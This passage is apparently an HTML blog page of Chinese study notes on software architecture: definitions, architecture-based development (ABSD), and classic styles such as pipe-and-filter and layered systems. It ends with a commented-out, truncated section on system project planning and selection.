软件架构设计</h1><h2 id="51-软件架构概念"><a class="markdownIt-Anchor" href="#51-软件架构概念"></a> 5.1 软件架构概念</h2><h3 id="511-软件架构的定义"><a class="markdownIt-Anchor" href="#511-软件架构的定义"></a> 5.1.1 软件架构的定义</h3><p>  一个程序和计算机系统软件的架构是指系统的一个或多个结构。结构中包括软件的构件，构件的外部可见属性以及它们之间的相互关系。<br />  软件架构仍在不断发展中，还没有形成一个统一的、公认的定义，这里仅举出几个较权威的定义。</p><ul><li>定义 1<br />  软件或计算机系统的软件架构是该系统的一个（或多个）结构，而结构由软件元素、元素的外部可见属性及它们之间的关系组成。</li><li>定义 2<br />  软件架构为软件系统提供了一个结构、行为和属性的高级抽象，由构成系统的元素的描述、这些元素的相互作用、指导元素集成的模式及这些模式的约束组成。</li><li>定义 3<br />  软件架构是指一个系统的基础组织，它具体体现在：系统的构件，构件之间、构件与环境之间的关系，以及指导其设计和演化的原则上。（IEEE1471- 2000）</li></ul><p>  前两个定义都是按“元素—结构—架构”这一抽象层次来描述的，它们的基本意义相同，其中定义 1 较通俗，因此，本章采用这一定义。该定义中的“软件元素”是指比“构件”更一般的抽象，元素的“外部可见属性”是指其他元素对该元素所做的假设，如它所提供的服务、性能特征等。</p><p>  为了更好地理解软件架构的定义，特作如下说明：</p><ol><li>架构是对系统的抽象<br />  它通过描述元素、元素的外部可见属性及元素之间的关系来反映这种抽象。因此，仅与内部具体实现有关的细节是不属于架构的，即定义强调元素的“外部可见”属性。</li><li>架构由多个结构组成<br />  结构是从功能角度来描述元素之间的关系的，具体的结构传达了架构某方面的信息，但是个别结构一般不能代表大型软件架构。</li><li>任何软件都存在架构，但不一定有对该架构的具体表述文档<br />  即架构可以独立于架构的描述而存在。如文档已过时，则该文档不能反映架构。</li><li>元素及其行为的集合构成架构的内容<br />  体现系统由哪些元素组成，这些元素各有哪些功能（外部可见），以及这些元素间如何连接与互动。即在两个方面进行抽象：在静态方面，关注系统的大粒度（宏观）总体结构（如分层）；在动态方面，关注系统内关键行为的共同特征。</li><li>架构具有“基础”性<br />  它通常涉及解决各类关键的重复问题的通用方案（复用性），以及系统设计中影响深远（架构敏感）的各项重要决策（一旦贯彻，更改的代价昂贵）。</li><li>架构隐含有“决策”<br />  架构是由架构设计师根据关键的功能和非功能性需求（质量属性及项目相关的约束）进行设计与决策的结果。不同的架构设计师设计出来的架构是不一样的，为避免架构设计师考虑不周，重大决策应经过评审。特别是架构设计师自身的水平是一种约束，不断学习和积累经验才是摆脱这种约束走向自由王国的必经之路。</li></ol><p>  在设计软件架构时也必须考虑硬件特性和网络特性，因此，软件架构与系统架构二者间的区别其实不大。但是，在大多情况下，架构设计师在软件方面的选择性较之硬件方面，其自由度大得多。因此，使用“软件架构”这一术语，也表明了一个观点：架构设计师通常将架构的重点放在软件部分。<br />  将软件架构置于商业背景中进行观察，可以发现软件架构对企业非常重要。</p><ol><li>影响架构的因素<br />  软件系统的项目干系人（客户、用户、项目经理、程序员、测试人员、市场人员等）对软件系统有不同的要求开发组织（项目组）有不同的人员知识结构、架构设计师的素质与经验、当前的技术环境等方面都是影响架构的因素。<br />  这些因素通过功能性需求、非功能性需求、约束条件及相互冲突的要求，影响架构设计师的决策，从而影响架构。</li><li>架构对上述诸因素具有反作用<br />  例如，影响开发组织的结构。架构描述了系统的大粒度（宏观）总体结构，因此可以按架构进行分工，将项目组为几个工作组，从而使开发有序；影响开发组织的目标，即成功的架构为开发组织提供了新的商机，这归功于：系统的示范性、架构的可复用性及团队开发经验的提升，同时，成功的系统将影响客户对下一个系统的要求等。这种反馈机制构成了架构的商业周期。</li></ol><h3 id="512-软件架构设计与生命周期"><a class="markdownIt-Anchor" href="#512-软件架构设计与生命周期"></a> 5.1.2 软件架构设计与生命周期</h3><h4 id="1-需求分析阶段"><a class="markdownIt-Anchor" href="#1-需求分析阶段"></a> 1. 需求分析阶段</h4><p>  在本质上，需求和架构设计面临的是不同的对象：一个是问题空间，一个是解空间。从需求模型向架构模型转换时主要关注两个问题：</p><ol><li>如何根据需求模型构件架构模型</li><li>如何保证模型转换的可追踪性</li></ol><h4 id="2-设计阶段"><a class="markdownIt-Anchor" href="#2-设计阶段"></a> 2. 设计阶段</h4><p>  设计阶段主要可分为三个层次：</p><ol><li>架构的基本概念<br />  即架构模型由哪些元素组成，这些组成元素之间按照何种原则组织。</li><li>体系结构描述语言<br />  是支持构件、构件间连接方式及其配置的描述语言。</li><li>架构模型的多视图表示<br />  从不同的视角描述特定的体系结构，从而得到多个视图，并将这些视图组织起来以描述整体的架构模型。</li></ol><h4 id="3-实现阶段"><a class="markdownIt-Anchor" href="#3-实现阶段"></a> 3. 实现阶段</h4><p>  为了有效实现从架构设计向实现的转换，实现阶段的体系结构研究主要从以下几个方面开展：</p><ol><li>研究基于架构的开发过程支持，如项目组织结构、配置管理等。</li><li>寻求从架构向实现过渡的途径，如将程序设计语言元素引入架构阶段、模型映构件组装、复用中间件等。</li><li>研究基于架构的测试技术。</li></ol><p>  为了填补高层架构模型和底层实现之间的鸿沟，通过封装底层的实现细节，模型转换、精化等手段缩小概念之间的差距，典型方法如下：</p><ol><li>在架构模型中引入实现阶段的概念，如引入程序设计语言元素等。</li><li>通过模型转换技术，将高层的架构模型逐步精化呈能够支持实现的模型。</li><li>封装底层的实现细节，使之成为较大粒度构件，在架构指导下通过构件组装的方式实现系统，这往往需要底层中间件平台的支持。</li></ol><h4 id="4-构件组装阶段"><a class="markdownIt-Anchor" href="#4-构件组装阶段"></a> 4. 构件组装阶段</h4><p>  构件组装阶段研究的主要内容包括：</p><ol><li>如何支持可复用构件构件的互联。</li><li>组装过程中如何检测并消除体系结构失配的问题。</li></ol><h4 id="5-部署阶段"><a class="markdownIt-Anchor" href="#5-部署阶段"></a> 5. 部署阶段</h4><p>  架构对软件部署的作用如下：</p><ol><li>提供高层的体系结构视图描述部署阶段的软硬件模型。</li><li>基于架构模型可以分析部署方案的质量属性，从而选择合理的部署方案。</li></ol><h4 id="6-后开发阶段"><a class="markdownIt-Anchor" href="#6-后开发阶段"></a> 6. 后开发阶段</h4><p>  这一阶段的研究主要包括：</p><ol><li>动态软件体系结构<br />  主要可以分为以下两个部分<ul><li>体系结构设计阶段的支持<br />  主要包括变化的描述、根据变化如何生成修改策略、描述修改过程、在高抽象层次保证修改的可行性以及分析、推理所带来的影响等。</li><li>运行时刻基础设施的支持<br />  主要包括系统体系结构的维护、保证体系结构修改在约束范围内、提供系统的运行时刻心系、分析修改后的体系结构符合指定的属性、正确映射体系结构构造元素的变化到实现模块、保证系统重要子系统连续执行并保持状态、分析和测试运行系统。</li></ul></li><li>体系结构恢复与重建<br />  架构重建是指从已实现的系统中获取体系结构的过程。一般重建的输出是一组体系结构视图。现有的重建方法可以分为4类：<ul><li>手工体系结构重建</li><li>工具支持的手工重建</li><li>通过查询语言来自动建立聚集</li><li>使用其他技术，比如数据挖掘等。</li></ul></li></ol><h3 id="513-软件架构的重要性"><a class="markdownIt-Anchor" href="#513-软件架构的重要性"></a> 5.1.3 软件架构的重要性</h3><h4 id="1-架构设计能够满足系统的品质"><a class="markdownIt-Anchor" href="#1-架构设计能够满足系统的品质"></a> 1. 架构设计能够满足系统的品质</h4><p>  系统的功能性是软件架构师通过组成体系架构的多种元素之间的交互作用来支持的。架构设计用于实现雄的品质如性能、安全性和可维护性等。通过架构设计文档化，可以尽早的评估项目的这些品质。</p><h4 id="2-架构设计使受益人达成一致的目标"><a class="markdownIt-Anchor" href="#2-架构设计使受益人达成一致的目标"></a> 2. 架构设计使受益人达成一致的目标</h4><p>  架构设计的过程使得不同的受益人达成一致的目标，体系架构的过程需要确保架构设计被清楚的传达与理解。</p><h4 id="3-架构设计能够支持计划编制过程"><a class="markdownIt-Anchor" href="#3-架构设计能够支持计划编制过程"></a> 3. 架构设计能够支持计划编制过程</h4><p>  架构设计将确定组件之间的依赖关系，直接支持项目计划和项目管理的活动。</p><h4 id="4-架构设计对系统开发有指导性"><a class="markdownIt-Anchor" href="#4-架构设计对系统开发有指导性"></a> 4. 架构设计对系统开发有指导性</h4><p>  架构设计的主要目标就是确保体系架构能够为设计人员和实现人员所承担的工作提供可靠的框架。架构师必须明确地定义体系架构，因为它确定了体系架构的重要元素，例如系统的组件、组件之间的接口以及组件之间的通信。</p><h4 id="5-架构设计能够有效地管理复杂性"><a class="markdownIt-Anchor" href="#5-架构设计能够有效地管理复杂性"></a> 5. 架构设计能够有效地管理复杂性</h4><p>  体系架构通过构件及构件之间的关系，描述了一个抽象的系统，因而提供了高层次的复杂管理的方法。</p><h4 id="6-架构设计为复用奠定了基础"><a class="markdownIt-Anchor" href="#6-架构设计为复用奠定了基础"></a> 6. 架构设计为复用奠定了基础</h4><p>  架构设计过程可以同时支持使用和建立复用资源。</p><h4 id="7-架构设计能够降低维护费用"><a class="markdownIt-Anchor" href="#7-架构设计能够降低维护费用"></a> 7. 架构设计能够降低维护费用</h4><h4 id="8-架构设计能够支持冲突分析"><a class="markdownIt-Anchor" href="#8-架构设计能够支持冲突分析"></a> 8. 架构设计能够支持冲突分析</h4><p>  架构设计可以允许我们在采取改变之前推断它所产生的影响。</p><h2 id="52-基于架构的软件开发方法"><a class="markdownIt-Anchor" href="#52-基于架构的软件开发方法"></a> 5.2 基于架构的软件开发方法</h2><h3 id="521-架构的设计方法概述"><a class="markdownIt-Anchor" href="#521-架构的设计方法概述"></a> 5.2.1 架构的设计方法概述</h3><p>  基于架构的软件设计（Architecture-Based Software Design，ABSD）是一种架构驱动方法。这种方法有 3 个基础：</p><ol><li>功能的分解<br />  在功能分解中，ABSD 方法使用已有的基于模块的内聚和耦合技术。</li><li>通过选择架构风格来实现质量和业务需求。</li><li>软件模板的使用<br />  软件模板利用了一些软件系统的结构。</li></ol><p>  ABSD 方法是递归的，且迭代的每一个步骤都是清晰定义的。因此，不管设计是否完成，架构总是清晰的，这有助于降低架构设计的随意性。</p><h3 id="522-基于架构的开发模型"><a class="markdownIt-Anchor" href="#522-基于架构的开发模型"></a> 5.2.2 基于架构的开发模型</h3><p>  基于架构的软件开发模型（Architecture-Based Software Design Model，ABSDM）把整个基于架构的软件过程划分为<code>架构需求</code>、<code>设计</code>、<code>文档化</code>、<code>复审</code>、<code>实现</code>、<code>演化</code>等 6 个子过程，如下图所示。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/sghqsg.png" alt="基于架构的软件开发模型" /></p><h3 id="523-架构需求"><a class="markdownIt-Anchor" href="#523-架构需求"></a> 5.2.3 架构需求</h3><p>  需求是指用户对目标软件系统在<code>功能</code>、<code>行为</code>、<code>性能</code>、<code>设计约束</code>等方面的期望。需求过程如下图所示</p><p><img src="https://pic.lufer.cc/images/2021/03/15/sg4I0J.png" alt="架构需求过程" /></p><h4 id="1-需求获取"><a class="markdownIt-Anchor" href="#1-需求获取"></a> 1. 需求获取</h4><p>  架构需求一般来自三个方面，分别是<code>系统的质量目标</code>、<code>系统的业务目标</code>和<code>系统开发人员的业务目标</code>。软件架构需求获取过程主要是定义开发人员必须实现的软件功能，使得用户能完成他们的任务，从而满足业务上的功能需求。与此同时，还要获得软件质量属性，满足一些非功能需求。</p><h4 id="2-标识构件"><a class="markdownIt-Anchor" href="#2-标识构件"></a> 2. 标识构件</h4><p>  在<code>架构需求过程图</code>中虚框部分属于标识构件过程，该过程为系统生成初始逻辑结构，包含大致的构件。这一过程又可分为三步来实现。</p><ol><li>生成类图</li><li>对类进行分组<br />  一般地，与其他类隔离的类形成一个组，由泛化关联的类组成一个附加组，由聚合或组合关联的类也形成一个附加组。</li><li>把类打包成构件<br />  这些构件可以分组合并成更大的构件。</li></ol><h4 id="3-需求评审"><a class="markdownIt-Anchor" href="#3-需求评审"></a> 3. 需求评审</h4><p>  组织一个由不同代表（如分析人员、客户、设计人员、测试人员）组成的小组，对架构需求及相关构件进行仔细的审查。审查的主要内容包括所获取的需求是否真实反映了用户的要求，类的分组是否合理，构件合并是否合理等。<br />  必要时，可以在“需求获取—标识构件—需求评审”之间进行迭代。</p><h3 id="524-架构设计"><a class="markdownIt-Anchor" href="#524-架构设计"></a> 5.2.4 架构设计</h3><p>  架构需求用来激发和调整设计决策，不同的视图被用来表达与质量目标有关的信息。架构设计是一个迭代过程，如果要开发的系统能够从已有的系统中导出大部分，则可以使用已有系统的设计过程。架构设计过程如下图所示。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/sgIqsO.png" alt="架构设计过程" /></p><h4 id="1-提出软件架构模型"><a class="markdownIt-Anchor" href="#1-提出软件架构模型"></a> 1. 提出软件架构模型</h4><p>  在建立架构的初期，选择一个合适的架构风格是首要的。在这个风格基础上，开发人员通过架构模型，可以获得关于架构属性的理解。此时，虽然这个模型是理想化的（其中的某些部分可能错误地表示了应用的特征），但是该模型为将来的实现和演化过程建立了目标。</p><h4 id="2-把已标识的构件映射到软件架构中"><a class="markdownIt-Anchor" href="#2-把已标识的构件映射到软件架构中"></a> 2. 把已标识的构件映射到软件架构中</h4><p>  把在架构需求阶段已标识的构件映射到架构中，将产生一个中间结构，这个中间结构只包含那些能明确适合架构模型的构件。</p><h4 id="3-分析构件之间的相互作用"><a class="markdownIt-Anchor" href="#3-分析构件之间的相互作用"></a> 3. 分析构件之间的相互作用</h4><p>  为了把所有已标识的构件集成到架构中，必须认真分析这些构件的相互作用和关系。</p><h4 id="4-产生软件架构"><a class="markdownIt-Anchor" href="#4-产生软件架构"></a> 4. 产生软件架构</h4><p>  一旦决定了关键的构件之间的关系和相互作用，就可以在第 2 阶段得到的中间架构的基础上进行细化。</p><h4 id="5-设计评审"><a class="markdownIt-Anchor" href="#5-设计评审"></a> 5. 设计评审</h4><p>  一旦设计了软件架构，我们必须邀请独立于系统开发的外部人员对架构进行评审。</p><h3 id="525-架构文档化"><a class="markdownIt-Anchor" href="#525-架构文档化"></a> 5.2.5 架构文档化</h3><p>  文档是在系统演化的每一个阶段，系统设计与开发人员的通信媒介，是为验证架构设计和提炼或修改这些设计（必要时）所执行预先分析的基础。<br />  架构文档化过程的主要输出结果是<code>架构需求规格说明</code>和<code>测试架构需求的质量设计说明书</code>这两个文档。</p><h3 id="526-架构复审"><a class="markdownIt-Anchor" href="#526-架构复审"></a> 5.2.6 架构复审</h3><p>  在一个主版本的软件架构分析之后，要安排一次由<code>外部人员</code>（用户代表和领��专家）参加的复审。<br />  复审的目的是<code>标识潜在的风险</code>，以及早发现架构设计中的缺陷和错误，包括架构能否满足需求、质量需求是否在设计中得到体现、层次是否清晰、构件的划分是否合理、文档表达是否明确、构件的设计是否满足功能与性能的要求等等。</p><h3 id="527-架构实现"><a class="markdownIt-Anchor" href="#527-架构实现"></a> 5.2.7 架构实现</h3><p>  所谓“实现”就是要用实体来显示出一个软件架构，即要符合架构所描述的结构性设计决策，分割成规定的构件，按规定方式互相交互。架构的实现过程如下图所示。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/sgTd4s.png" alt="架构实现过程" /></p><p>  上图中的虚框部分是架构的实现过程。整个实现过程是以复审后的文档化的架构说明书为基础的，每个构件必须满足软件架构中说明的对其他构件的责任。这些决定即实现的约束是在系统级或项目范围内做出的，每个构件上工作的实现者是看不见的。<br />  在架构说明书中，已经定义了系统中构件与构件之间的关系。因为在架构层次上，构件接口约束对外唯一地代表了构件，所以可以从构件库中查找符合接口约束的构件，必要时开发新的满足要求的构件。<br />  然后，按照设计提供的结构，通过组装支持工具把这些构件的实现体组装起来，完成整个软件系统的连接与合成。<br />  最后一步是测试，包括单个构件的功能性测试和被组装应用的整体功能和性能测试。</p><h3 id="528-架构演化"><a class="markdownIt-Anchor" href="#528-架构演化"></a> 5.2.8 架构演化</h3><p>  在构件开发过程中，最终用户的需求可能还有变动。在软件开发完毕，正常运行后，由一个单位移植到另一个单位，需求也会发生变化。在这两种情况下，就必须相应地修改软件架构，以适应新的软件需求。架构演化过程如下图所示。架构演化是<code>使用系统演化步骤去修改应用</code>，以满足新的需求。主要包括以下七个步骤：</p><p><img src="https://pic.lufer.cc/images/2021/03/15/sg7NM6.png" alt="架构演化过程" /></p><h4 id="1-需求变动归类"><a class="markdownIt-Anchor" href="#1-需求变动归类"></a> 1. 需求变动归类</h4><p>  首先必须对用户需求的变化进行归类，使变化的需求与已有构件对应。对找不到对应构件的变动，也要做好标记，在后续工作中，将创建新的构件，以对应这部分变化的需求。</p><h4 id="2-制订架构演化计划"><a class="markdownIt-Anchor" href="#2-制订架构演化计划"></a> 2. 制订架构演化计划</h4><p>  在改变原有结构之前，开发组织必须制订一个周密的架构演化计划，作为后续演化开发工作的指南。</p><h4 id="3-构件变动"><a class="markdownIt-Anchor" href="#3-构件变动"></a> 3. 构件变动</h4><p>  修改、增加或删除构件在演化计划的基础上，开发人员可根据在第一步得到的需求变动的归类情况，决定是否修改或删除存在的构件、增加新构件。最后，对修改和增加的构件进行功能性测试。</p><h4 id="4-更新构件的相互作用"><a class="markdownIt-Anchor" href="#4-更新构件的相互作用"></a> 4. 更新构件的相互作用</h4><p>  随着构件的增加、删除和修改，构件之间的控制流必须得到更新。</p><h4 id="5-构件组装与测试"><a class="markdownIt-Anchor" href="#5-构件组装与测试"></a> 5. 构件组装与测试</h4><p>  通过组装支持工具把这些构件的实现体组装起来，完成整个软件系统的连接与合成，形成新的架构。然后对组装后的系统的整体功能和性能进行测试。</p><h4 id="6-技术评审"><a class="markdownIt-Anchor" href="#6-技术评审"></a> 6. 技术评审</h4><p>  对以上步骤进行确认，进行技术评审。评审组装后的架构是否反映需求变动，符合用户需求。如果不符合，则需要在第 2 到第 6 步之间进行迭代。</p><h4 id="7-演化后的架构"><a class="markdownIt-Anchor" href="#7-演化后的架构"></a> 7. 演化后的架构</h4><p>  在原来系统上所作的所有修改必须集成到原来的架构中，完成一次演化过程，产生演化后的架构。</p><h2 id="53-软件架构风格"><a class="markdownIt-Anchor" href="#53-软件架构风格"></a> 5.3 软件架构风格</h2><p>  软件架构设计的一个核心问题是能否使用重复的软件架构模式，即能否达到架构级别的软件重用。也就是说，能否在不同的软件系统中，使用同一架构。基于这个目的，学者们开始研究和实践软件架构的风格和类型问题。</p><h3 id="531-软件架构风格概述"><a class="markdownIt-Anchor" href="#531-软件架构风格概述"></a> 5.3.1 软件架构风格概述</h3><p>  软件架构风格是描述某一特定应用领域中系统组织方式的惯用模式（ idiomatic paradigm）。架构风格反映了领域中众多系统所共有的结构和语义特性，并指导如何将各个模块和子系统有效地组织成一个完整的系统。</p><h3 id="532-经典软件架构风格"><a class="markdownIt-Anchor" href="#532-经典软件架构风格"></a> 5.3.2 经典软件架构风格</h3><h4 id="1-管道和过滤器"><a class="markdownIt-Anchor" href="#1-管道和过滤器"></a> 1. 管道和过滤器</h4><p>  在管道/过滤器风格的软件架构中，每个构件都有一组输入和输出，构件读输入的数据流，经过内部处理，然后产生输出数据流。这个过程通常通过对输入流的变换及增量计算来完成，所以在输入被完全消费之前，输出便产生了。因此，这里的构件被称为过滤器，这种风格的连接件就像是数据流传输的管道，将一个过滤器的输出传到另一过滤器的输入。此风格特别重要的过滤器必须是独立的实体，它不能与其他的过滤器共享数据，而且一个过滤器不知道它上游和下游的标识。一个管道/过滤器网络输出的正确性并不依赖于过滤器进行增量计算过程的顺序。<br />  下图是管道/过滤器风格的示意图。一个典型的管道/过滤器架构的例子是以 UNIX shell 编写的程序。UNIX 既提供一种符号，以连接各组成部分（UNIX 的进程），又提供某种进程运行时机制以实现管道。另一个著名的例子是传统的编译器。传统的编译器一直被认为是一种管道系统，在该系统中，一个阶段（包括词法分析、语法分析、语义分析和代码生成）的输出是另一个阶段的输入。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/yhiFF1.png" alt="管道/过滤器风格的架构" /></p><p>  管道/过滤器风格的软件架构具有许多很好的特点：</p><ol><li>使得软构件具有良好的隐蔽性和高内聚、低耦合的特点；</li><li>允许设计者将整个系统的输入/输出行为看成是多个过滤器的行为的简单合成；</li><li>支持软件重用。只要提供适合在两个过滤器之间传送的数据，任何两个过滤器都可被连接起来；</li><li>系统维护和增强系统性能简单。新的过滤器可以添加到现有系统中来；旧的可以被改进的过滤器替换掉；</li><li>允许对一些如吞吐量、死锁等属性的分析；</li><li>支持并行执行。每个过滤器是作为一个单独的任务完成，因此可与其他任务并行执行。</li></ol><p>  但是，这样的系统也存在着若干不利因素。</p><ol><li>通常导致进程成为批处理的结构。这是因为虽然过滤器可增量式地处理数据，但它们是独立的，所以设计者必须将每个过滤器看成一个完整的从输入到输出的转换；</li><li>不适合处理交互的应用。当需要增量地显示改变时，这个问题尤为严重；</li><li>因为在数据传输上没有通用的标准，每个过滤器都增加了解析和合成数据的工作，这样就导致了系统性能下降，并增加了编写过滤器的复杂性。</li></ol><h4 id="2-数据抽象和面向对象组织"><a class="markdownIt-Anchor" href="#2-数据抽象和面向对象组织"></a> 2. 数据抽象和面向对象组织</h4><p>  抽象数据类型概念对软件系统有着重要作用，目前软件界已普遍使用面向对象系统。这种风格建立在数据抽象和面向对象的基础上，数据的表示方法和它们的相应操作封装在一个抽象数据类型或对象中。这种风格的构件是对象，或者说是抽象数据类型的实例。对象是一种被称作管理者的构件，因为它负责保持资源的完整性。对象是通过函数和过程的调用来交互的。<br />  下图是数据抽象和面向对象风格的示意图。</p><p><img src="https://www.853tv.cn/imgs/2021/03/bb10ec06b2d5bf85.png" alt="数据抽象和面向对象风格的架构" /></p><p>  这种风格的两个重要特征为：</p><ol><li>对象负责维护其表示的完整性；</li><li>对象的表示对其他对象而言是隐蔽的。因为一个对象对它的客户隐藏了自己的表示，所以这些对象可以不影响它的客户就能改变其实现方法。</li></ol><p>  面向对象的系统有许多优点，并早已为人所知：</p><ol><li>因为对象对其他对象隐藏它的表示，所以可以改变一个对象的表示，而不影响其他的对象；</li><li>设计者可将一些数据存取操作的问题分解成一些交互的代理程序的集合。</li></ol><p>  但是，面向对象的系统也存在着某些问题：</p><ol><li>为了使一个对象和另一个对象通过过程调用等进行交互，必须知道对象的标识。只要一个对象的标识改变了，就必须修改所有其他明确调用它的对象；</li><li>必须修改所有显式调用它的其他对象，并消除由此带来的一些副作用。例如，如果 A 使用了对象 B，C 也使用了对象 B，那么，C 对 B 的使用所造成的对 A 的影响可能是料想不到的。</li></ol><h4 id="3-事件驱动系统"><a class="markdownIt-Anchor" href="#3-事件驱动系统"></a> 3. 事件驱动系统</h4><p>  构件不直接调用一个系统，而是触发或广播一个或多个事件。系统中的其他构件中的过程在一个或多个事件中注册。当一个事件被触发，系统自动调用在这个事件中注册的所有过程，这样一个事件的触发就导致了另一模块中的过程的调用</p><h4 id="4-分层系统"><a class="markdownIt-Anchor" href="#4-分层系统"></a> 4. 分层系统</h4><p>  层次系统组织成一个层次结构，每一层为上层服务，并作为下层客户。在一些层次系统中，除了一些精心挑选的输出函数外，内部的层只对相邻的层可见。这样的系统中构件在一些层实现了虚拟机（在另一些层次系统中层是部分不透明的）。连接件通过决定层间如何交互的协议来定义，拓扑约束包括对相邻层间交互的约束。<br />  这种风格支持基于可增加抽象层的设计。这样，允许将一个复杂问题分解成一个增量步骤序列的实现。由于每一层最多只影响两层，同时只要给相邻层提供相同的接口，允许每层用不同的方法实现，同样为软件重用提供了强大的支持。<br />  下图是层次系统风格的示意图。层次系统最广泛的应用是分层通信协议。在这一应用领域中，每一层提供一个抽象的功能，作为上层通信的基础。较低的层次定义低层的交互，最低层通常只定义硬件物理连接。</p><p><img src="https://www.853tv.cn/imgs/2021/03/2bc86053168c7ea1.png" alt="层次系统风格的架构" /></p><p>  层次系统有许多可取的属性：</p><ol><li>支持基于抽象程度递增的系统设计，使设计者可以把一个复杂系统按递增的步骤进行分解；</li><li>支持功能增强，因为每一层至多和相邻的上下层交互，因此功能的改变最多影响相邻的上下层；</li><li>支持重用。只要提供的服务接口定义不变，同一层的不同实现可以交换使用。这样，就可以定义一组标准的接口，而允许各种不同的实现方法。</li></ol><p>  但是，层次系统也有其不足之处：</p><ol><li>并不是每个系统都可以很容易地划分为分层的模式，甚至即使一个系统的逻辑结构是层次化的，出于对系统性能的考虑，系统设计师不得不把一些低级或高级的功能综合起来；</li><li>很难找到一个合适的、正确的层次抽象方法。</li></ol><h4 id="5-仓库系统及知识库"><a class="markdownIt-Anchor" href="#5-仓库系统及知识库"></a> 5. 仓库系统及知识库</h4><!-- # 第七章 系统规划&emsp;&emsp;系统计划主要用于描述从项目提出、选择到确立的过程，包括系统项目的提出与可行性分析，系统方案的制订、评价和改进，新旧系统的分析和比较，以及现有软件、硬件和数据资源的有效利用等问题。## 7.1 项目的提出与选择&emsp;&emsp;组织在信息化的过程中，可能基于各种动机提出系统项目的建设，有关人员要根据这些动机，提出和确定信息系统的工作范围，确定项目立项，提出系统选择方案，给出选择结果。### 7.1.1 项目的立项目标和动机&emsp;&emsp;企事业单位在其自身的经营管理过程中，对于项目的立项建设可能具有多种动机，通常可归结为下列几种。1. 进行基础研究并获取技术  &emsp;&emsp;此类项目通常由大学院校或企业集团的战略研究性部门提出和实施。小规模的研究组织可能仅仅是企业中的一个研发部门或从事研发工作的团队；中大规模的研究组织包括研究所或研究院这种独立建制的单位；大规模的研究性项目可类似于国家 863 计划等跨行业、跨地域协作的国家级重大项目立项。2. 进行应用研发并获得产品  &emsp;&emsp;此类项目通常由企业进行立项和开发，企业立项的基本动机通常是为了得到应用软件产品并向目标客户群进行销售从而获取利润等。产品一般会基于某类特定客户群体的需求进行设计，有明确和具体的研发目标需求，有严格的时间限制、资源预算等，因此可归入 “应用研发”型软件。  &emsp;&emsp;应用研发型软件通常具有一定的通用性，客户广泛，既可能是面向个人消费者的工具软件（例如 Office、杀毒软件、游戏软件等），也可能是面向特定领域或行业的工具软件（例如 SQL Server 数据库、AutoCAD 工程绘图软件、Rational Rose 这样的建模工具软件等）。3. 提供技术服务  &emsp;&emsp;对此类项目进行立项的企业通常能向目标客户群提供比较全面的技术服务而不是单一的软件产品。因此企业的服务范围可能包含提供技术和解决方案的咨询、利用现有产品进行系统集成和服务、面向特定客户的软件项目定制开发、对现有的软件系统进行升级和改造、提供软件应用相关的技术支持、服务和培训等服务中的一个或多个内容。   &emsp;&emsp;总的来说，此类组织通常会面向一个特定行业、具有相对稳定性的客户群体，通过提供一种综合性服务来获取市场价值，因此可以把此类公司看做“服务”导向的组织。4. 信息技术产品的使用者  &emsp;&emsp;信息技术的使用者是最终客户。对他们来说，软件项目的立项动机既不是为了得到软件产品而进行销售，也不是为了提供技术服务，而是通过购买产品或服务来得到使用价值。例如：一个消费者购买了绘图软件是为了存储和处理个人数码相机中的照片；而一个企业通过实施 ERP（Enterprise Resource Planning，企业资源计划）可能是为了达到生产能力的控制、生产计划科学性、提高管理水平、获取新的决策能力、降低库存成本、提高资金周转率、建立面向市场订单生产方式等目标，并期望通过这些目标的实现来增强企业竞争力、获取更大的市场份额。对信息技术的使用者来说，信息技术是一种手段，同时也是一种成本。如何用最小的成本和风险获得满意的效果是客户最关心的问题。### 7.1.2 项目的选择和确定&emsp;&emsp;系统项目的选择至少包含两种实用性目的，一个是软件开发公司在诸多的产品方向中`选择适当的方向`进行研究和开发，另一种是客户从诸多的产品中购买`适合自己需要的产品或技术方案`进行实施。与系统项目提出的问题一样，并不存在一个统一模式进行系统项目的选择和取舍，但可以提出进行项目取舍和评估的若干原则。通过使用项目取舍和评估的原则，可以逐步排除那些不符合需求的项目定义，从而找到比较适合的项目或产品开发方向。#### 1．选择有核心价值的产品/项目或开发方向&emsp;&emsp;这个策略关键在于确定什么样的系统项目是有价值的。由于立项单位所处的行业、在行业中的位置、立项目标等因素不同，对软件项目的价值判断也不同。但“有核心价值的软件项目”通常总是和企业或客户的核心业务相关的。  &emsp;&emsp;美国哈佛商学院的著名教授Michael Porter曾经在他的《竞争优势》（CompetitiveAdvantage）一书中提出了`“价值链”`的概念，价值链把企业运作的各种活动划分为产品设计、产品生产、产品营销和产品应用等独立领域，企业的价值链也可以进一步和上游供货商与下游买主的价值链相连，从而构成一个产业的价值链。如果以“价值链”的观点来看待软件产品或项目，软件是作为一种技术服务手段被运用到企业业务的价值链上的，通过实现价值链中的关键业务的信息化从而最终改善客户单位的企业质量，同时也使软件开发公司获得现实的经济利益。  &emsp;&emsp;因此，在企业或客户经营活动中对价值链增值最大的部分，就是企业或客户的“核心业务”。针对核心业务的信息化产品或项目，通常都是具有高价值的，也可以说，所谓的 “行业信息化”的关键就是该行业中这些核心业务的信息化改造。例如：1. 对生产制造业的企业来说，生产计划、库存控制、实现面向订单的生产就是核心业务，无论实施 ERP 还是小规模的 MIS 系统，针对这些部分的软件功能总是被客户认为是最有价值的。2. 对于金融保险行业来说，由于保险公司的基本职责是分摊风险和补偿损失，所以一般要求保险公司有足够的分散风险的能力。因此，管理保单数据的业务系统、评估风险的定损系统等就是非常有价值的软件系统。3. 对于教育行业来说，因为学校的核心职能是教书育人，因此与教研、教学、考试、评价等业务相关的软件系统，以及支持上述业务开展的教育资源库软件、电子图书馆软件等就是高价值的软件系统。 &emsp;&emsp;总之，选择软件项目，必须首先考察软件应用的行业、业务和目标，以便判明要建设的软件项目价值。#### 2．评估项目风险、收益和代价&emsp;&emsp;在判断出一个潜在的软件项目后，还应评估项目实施的风险、收益和维护付出的代价。对于开发产品进行销售的情况，主要评估的是产品的预期收益和为完成开发投入的各种资源（包括时间、人力、资金等），项目的风险主要是技术难度、技术能力、经济能力和各种资源是否能承担、是否是企业需要优先实施的项目、是否符合行业标准和国家政策规定（例如：在电子签章没有经过国家法律许可之前，使用电子签章替代手工操作可能是有风险的）等。  &emsp;&emsp;对于购买产品或技术服务的客户来说，还应该评估项目实施后对自身业务变更，组织机构和人员职责的影响，现有的业务流程和人员的 IT 